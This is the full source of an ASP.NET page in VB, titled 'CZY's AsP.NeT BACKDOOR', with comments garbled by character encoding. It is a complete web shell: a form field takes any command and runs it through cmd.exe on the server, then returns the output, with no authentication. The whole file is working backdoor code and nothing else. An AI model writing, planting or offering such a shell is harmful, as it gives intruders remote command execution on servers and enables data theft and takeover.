   <%@ Page Language="VB" Debug="true" Trace="false"%>
   <%@ import Namespace="System.IO" %>
   <%@ Import Namespace="System.Diagnostics" %>
   <script runat="server" Language="vb">
       sub sendcmd(sender As Object, e As System.EventArgs)
            dim cmd1
            cmd1=cmdline.text
                 response.write (cmd1)
                 response.write ("<pre>")
                 Response.Write(Server.HtmlEncode(ExeCmd(cmd1)))
                 response.write ("</pre>")
       end sub

       function execmd(cmd1)
       Dim startInfo As New ProcessStartInfo()
       dim cmdout as new process()
       dim outstr as streamreader
       dim s as string
       startinfo.filename="cmd.exe"
       startinfo.Arguments = "/c "+cmd1
       startinfo.RedirectStandardOutput = true   '´ò¿ªÖØ¶¨ÏòÒ²¾ÍÏàµ±ÓÚÖ´ÐÐÁËcmd.exe /c ???>>>>
       startinfo.UseShellExecute = false         'Õâ¸öÖµ±ØÐëÎªfalse,²»È»Òª³ö´í
       cmdout=Process.Start(startInfo)

       cmdout.WaitForExit(5000)                   'ÉèÖÃ½ø³ÌÖ´ÐÐ³¬Ê±
       if cmdout.HasExited =false
          Response.Write("KILL cmd.exe process!</p>")
          cmdout.Kill()
          else
          Response.Write("Command is completed!</p>")
       end if

       outstr = cmdout.StandardOutput
       s = outstr.ReadToEnd()
       cmdout.Close()
       execmd=s
       end function


   </script>
   <html>
   <head>
   <title>CZY's AsP.NeT BACKDOOR,Wel&copy;ome to BbS.NsFoCuS.NeT</title>
   </head>
   <body>
       <form method="post" runat="server">
           <asp:TextBox id="cmdline" runat="server" size="80"></asp:TextBox>
           <asp:Button id="Button1" onclick="sendcmd" runat="server" Text="Send"></asp:Button>
       </form>
   </body>
   </html>
